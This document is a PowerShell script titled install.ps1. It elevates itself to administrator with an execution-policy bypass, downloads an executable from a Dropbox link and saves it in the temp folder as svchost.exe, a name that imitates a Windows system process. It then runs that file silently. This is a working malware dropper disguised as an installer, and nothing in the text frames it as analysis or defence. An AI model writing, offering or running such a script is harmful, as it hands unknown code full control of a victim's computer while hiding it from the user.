# install.ps1

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] `
[Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If not admin, relaunch script as admin
if (-not $isAdmin) {
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# Download file
$u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
$p = "$env:TEMP\svchost.exe"

Invoke-RestMethod $u -OutFile $p

# Run installer silently
Start-Process $p -ArgumentList "/silent /norestart" -Wait